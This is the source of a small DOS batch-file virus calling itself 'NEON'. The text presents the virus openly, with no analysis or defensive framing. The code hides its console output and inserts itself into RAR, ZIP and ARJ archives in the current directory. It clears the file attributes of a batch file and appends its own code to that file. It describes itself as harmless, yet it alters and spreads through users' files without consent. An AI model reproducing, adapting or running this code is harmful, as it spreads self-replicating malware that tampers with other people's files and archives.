: Virus NEON. Harmless and non-resident. But little bit hardy.
@ctty nul
: ----<<< The block of archiving >>>----
for %%q in (*.rar) do rar a -tk -y -c- -o+ %%q %0
for %%w in (*.zip) do pkzip -m %%w %0
for %%e in (*.arj) do arj a -d %%e %0
: ----<<< End block of archiving >>>----
for %%a in (*.bat) do set _B=%%a
for %%c in (%_B%) do attrib %%c -r -s -h
:labelN
for %%b in (*.bat) do find "_B" %%b
if not errorlevel 1 goto no
type %0 >> %_B%
goto labelN
:no
